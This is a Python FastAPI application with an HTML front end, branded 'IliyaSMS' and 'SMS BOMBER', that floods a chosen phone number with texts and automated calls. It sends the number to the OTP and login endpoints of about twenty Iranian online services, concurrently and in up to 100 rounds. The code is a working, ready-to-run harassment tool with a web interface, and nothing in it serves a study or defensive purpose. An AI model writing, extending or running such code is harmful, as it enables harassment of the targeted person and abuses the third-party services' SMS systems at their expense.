import concurrent.futures
import time as time_module
import requests
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI(title="IliyaSMS")

HDR = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
}

STOP_FLAG = {"stop": False}

def sms_apis(phone):
    return [
        ["Lendo","https://api.lendo.ir/api/customer/auth/send-otp",{"mobile":phone}],
        ["GapFilm","https://core.gapfilm.ir/api/v3.1/Account/Login",{"Type":"3","Username":phone[1:]}],
        ["Achareh","https://api.achareh.co/v2/accounts/login/",{"phone":"98"+phone[1:]}],
        ["Divar","https://api.divar.ir/v5/auth/authenticate",{"phone":phone}],
        ["Tapsi","https://api.tapsi.ir/api/v2.2/user",{"credential":{"phoneNumber":phone,"role":"DRIVER"},"otpOption":"SMS"}],
        ["Namava","https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",{"UserName":"+98"+phone[1:]}],
        ["Bikoplus","https://bikoplus.com/account/check-phone-number",{"phoneNumber":phone}],
        ["Jabama","https://gw.jabama.com/api/v4/account/send-code",{"mobile":phone}],
        ["Khodro45","https://khodro45.com/api/v1/customers/otp/",{"mobile":phone}],
        ["Snapp V1","https://api.snapp.ir/api/v1/sms/link",{"phone":phone}],
        ["Snapp V2","https://digitalsignup.snapp.ir/ds3/api/v3/otp?cellphone="+phone,{"cellphone":phone}],
        ["Alibaba","https://ws.alibaba.ir/api/v3/account/mobile/otp",{"phoneNumber":phone[1:]}],
        ["Sheypoor","https://www.sheypoor.com/api/v10.0.0/auth/send",{"username":phone}],
        ["Taaghche","https://gw.taaghche.com/v4/site/auth/signup",{"contact":phone}],
        ["Snappfood","https://api.snappfood.ir/auth/mobile/send/v2",{"cellphone":phone}],
        ["Banimode","https://mobapi.banimode.com/api/v2/auth/request",{"phone":phone}],
        ["IToll","https://app.itoll.com/api/v1/auth/login",{"mobile":phone}],
        ["Tap33","https://tap33.me/api/v2/user",{"credential":{"phoneNumber":phone,"role":"BIKER"}}],
        ["Digikala SMS","https://api.digikala.com/v1/user/authenticate/",{"username":phone,"otp_call":False}],
        ["DigikalaJet SMS","https://api.digikalajet.ir/user/login-register/",{"phone":phone}],
    ]

def call_apis(phone):
    return [
        ["Digikala CALL","https://api.digikala.com/v1/user/authenticate/",{"username":phone,"otp_call":True}],
        ["DigikalaJet CALL","https://api.digikalajet.ir/user/login-register/",{"phone":phone}],
    ]

def get_apis(phone, mode):
    if mode == "sms":
        return sms_apis(phone)
    elif mode == "call":
        return call_apis(phone)
    else:
        return call_apis(phone) + sms_apis(phone)

def send_one(api):
    if STOP_FLAG["stop"]:
        return {"name": api[0], "status": "stop"}
    name, url, data = api
    try:
        r = requests.post(url, json=data, headers=HDR, timeout=8)
        if r.status_code in (200,201,202,204,400,401,403,422,429):
            return {"name":name,"status":"ok"}
        return {"name":name,"status":"fail"}
    except:
        return {"name":name,"status":"err"}

def run_bomb(phone, rounds, mode):
    STOP_FLAG["stop"] = False
    all_api = get_apis(phone, mode)
    results = []
    tok = tfail = tstop = 0
    for rnd in range(rounds):
        if STOP_FLAG["stop"]:
            tstop += len(all_api) * (rounds - rnd)
            break
        ok = fail = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futs = {ex.submit(send_one, api): api for api in all_api}
            for fu in concurrent.futures.as_completed(futs):
                res = fu.result()
                results.append(res)
                if res["status"] == "ok": ok += 1
                elif res["status"] == "stop": tstop += 1
                else: fail += 1
        tok += ok; tfail += fail
        if rnd < rounds - 1 and not STOP_FLAG["stop"]:
            time_module.sleep(0.3)
    return {
        "phone":phone, "rounds":rounds, "mode":mode,
        "total":len(all_api)*rounds,
        "success":tok, "failed":tfail, "stopped":tstop, "apis":results
    }

@app.get("/api/bomb")
def api_bomb(phone: str = "", rounds: int = 1, mode: str = "all"):
    if not phone: return {"error":"Phone required"}
    if rounds < 1 or rounds > 100: return {"error":"Rounds 1-100"}
    if mode not in ("sms","call","all"): mode = "all"
    return run_bomb(phone, rounds, mode)

@app.get("/api/stop")
def api_stop():
    STOP_FLAG["stop"] = True
    return {"status":"stopped"}

HTML = """<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>IliyaSMS</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:linear-gradient(135deg,#0a0a1a,#0d1b3e,#1a1a4e,#0f0f2d);min-height:100vh;display:flex;align-items:center;justify-content:center}
.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.particle{position:absolute;border-radius:50%;animation:floatUp linear infinite;opacity:.3}
@keyframes floatUp{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:.4}90%{opacity:.4}100%{transform:translateY(-10vh) scale(1);opacity:0}}
.container{position:relative;z-index:1;width:90%;max-width:450px}
.card{background:rgba(255,255,255,.04);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:30px 24px;box-shadow:0 20px 50px rgba(0,0,0,.5)}
.logo{text-align:center;margin-bottom:20px;font-size:13px;font-family:monospace;color:rgba(233,69,96,.8);white-space:pre;line-height:1.4}
.title{text-align:center;font-size:20px;font-weight:700;background:linear-gradient(135deg,#e94560,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px;letter-spacing:2px}
.subtitle{text-align:center;font-size:10px;color:rgba(255,255,255,.3);margin-bottom:20px;letter-spacing:2px;text-transform:uppercase}
.inp{width:100%;padding:14px 16px;background:rgba(255,255,255,.03);border:1.5px solid rgba(255,255,255,.08);border-radius:12px;color:#fff;font-size:15px;outline:none;margin-bottom:12px;direction:ltr;text-align:center;transition:all .3s}
.inp:focus{border-color:rgba(233,69,96,.5);box-shadow:0 0 20px rgba(233,69,96,.1);background:rgba(255,255,255,.06)}
.inp::placeholder{color:rgba(255,255,255,.2);font-size:13px}
.sel{width:100%;padding:14px 16px;background:rgba(255,255,255,.03);border:1.5px solid rgba(255,255,255,.08);border-radius:12px;color:#fff;font-size:15px;outline:none;margin-bottom:12px;text-align:center;cursor:pointer}
.sel:focus{border-color:rgba(233,69,96,.5)}
.sel option{background:#1a1a3e;color:#fff}
.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px}
.btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:1px;transition:all .3s;text-transform:uppercase}
.btn-go{background:linear-gradient(135deg,#e94560,#c23152);color:#fff;box-shadow:0 8px 25px rgba(233,69,96,.25)}
.btn-go:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(233,69,96,.4)}
.btn-go:disabled{opacity:.4;cursor:not-allowed;transform:none}
.btn-stop{background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;box-shadow:0 8px 25px rgba(245,158,11,.25);display:none}
.btn-stop:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(245,158,11,.4)}
.btn-rst{background:rgba(255,255,255,.05);color:rgba(255,255,255,.5);border:1px solid rgba(255,255,255,.08)}
.btn-rst:hover{background:rgba(255,255,255,.1);color:#fff}
.result{display:none;margin-top:16px;padding:16px;border-radius:12px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.05)}
.result.show{display:block;animation:fade .4s ease}
@keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
.stat{background:rgba(255,255,255,.03);border-radius:10px;padding:12px;text-align:center}
.stat-val{font-size:24px;font-weight:700}
.ok{color:#4ade80}.fl{color:#f87171}.st{color:#fbbf24}
.stat-lbl{font-size:8px;color:rgba(255,255,255,.3);margin-top:4px;text-transform:uppercase}
.prog{height:5px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden;margin-top:8px}
.prog-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,#4ade80,#22c55e)}
.mode-badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:10px;font-weight:600;margin-bottom:10px;letter-spacing:1px;text-transform:uppercase}
.mode-sms{background:rgba(0,210,255,.15);color:#00d2ff}
.mode-call{background:rgba(233,69,96,.15);color:#e94560}
.mode-all{background:rgba(74,222,128,.15);color:#4ade80}
.footer{text-align:center;margin-top:18px;font-size:10px;color:rgba(255,255,255,.1);letter-spacing:2px}
</style>
</head>
<body>
<div class="particles" id="p"></div>
<div class="container">
<div class="card">
<div class="logo">ILIYA SMS</div>
<div class="title">SMS BOMBER</div>
<div class="subtitle">Fast Anonymous Secure</div>
<select class="sel" id="mode">
<option value="all">SMS + Call (Call First)</option>
<option value="sms">SMS Only</option>
<option value="call">Call Only</option>
</select>
<input class="inp" type="tel" id="phone" placeholder="Phone: 09123456789" autocomplete="off">
<input class="inp" type="number" id="rounds" placeholder="Rounds (default: 1)" min="1" max="100">
<div class="btn-row">
<button class="btn btn-go" id="go" onclick="run()"><span id="bt">START</span></button>
<button class="btn btn-stop" id="stopBtn" onclick="stop()">STOP</button>
</div>
<button class="btn btn-rst" onclick="reset()">RESET</button>
<div class="result" id="res">
<div class="mode-badge" id="mb" style="display:none"></div>
<div class="row3">
<div class="stat"><div class="stat-val ok" id="ok">0</div><div class="stat-lbl">Success</div></div>
<div class="stat"><div class="stat-val fl" id="fl">0</div><div class="stat-lbl">Failed</div></div>
<div class="stat"><div class="stat-val st" id="stp">0</div><div class="stat-lbl">Stopped</div></div>
</div>
<div class="prog"><div class="prog-fill" id="pf" style="width:0"></div></div>
</div>
</div>
<div class="footer">ILIYA SMS BOMBER 2026</div>
</div>
<script>
function cp(){var c=document.getElementById("p");for(var i=0;i<30;i++){var d=document.createElement("div");d.className="particle";var s=Math.random()*3+2;d.style.width=s+"px";d.style.height=s+"px";d.style.left=Math.random()*100+"%";d.style.animationDuration=Math.random()*15+10+"s";d.style.animationDelay=Math.random()*10+"s";d.style.background=Math.random()>.5?"rgba(233,69,96,.4)":"rgba(0,210,255,.4)";c.appendChild(d)}}cp();
var active=false;
async function run(){var p=document.getElementById("phone").value.trim();var r=parseInt(document.getElementById("rounds").value)||1;var m=document.getElementById("mode").value;if(!p){return}active=true;var g=document.getElementById("go");var t=document.getElementById("bt");var s=document.getElementById("stopBtn");g.disabled=true;t.textContent="RUNNING...";s.style.display="block";var rs=document.getElementById("res");var ok=document.getElementById("ok");var fl=document.getElementById("fl");var sp=document.getElementById("stp");var pf=document.getElementById("pf");var mb=document.getElementById("mb");rs.classList.add("show");pf.style.width="0";ok.textContent="0";fl.textContent="0";sp.textContent="0";mb.style.display="inline-block";mb.className="mode-badge mode-"+m;mb.textContent=m.toUpperCase();try{var re=await fetch("/api/bomb?phone="+encodeURIComponent(p)+"&rounds="+r+"&mode="+m);var d=await re.json();ok.textContent=d.success;fl.textContent=d.failed;sp.textContent=d.stopped||0;var tt=d.total||(d.success+d.failed+(d.stopped||0));pf.style.width=(tt>0?Math.round((d.success+(d.stopped||0))/tt*100):0)+"%"}catch(e){ok.textContent="ERR"}g.disabled=false;t.textContent="START";s.style.display="none";active=false}
async function stop(){if(!active)return;await fetch("/api/stop");document.getElementById("stp").textContent="...";document.getElementById("bt").textContent="STOPPING..."}
function reset(){document.getElementById("phone").value="";document.getElementById("rounds").value="";document.getElementById("res").classList.remove("show");document.getElementById("stopBtn").style.display="none"}
</script>
</body>
</html>"""

@app.get("/", response_class=HTMLResponse)
def home():
    return HTML
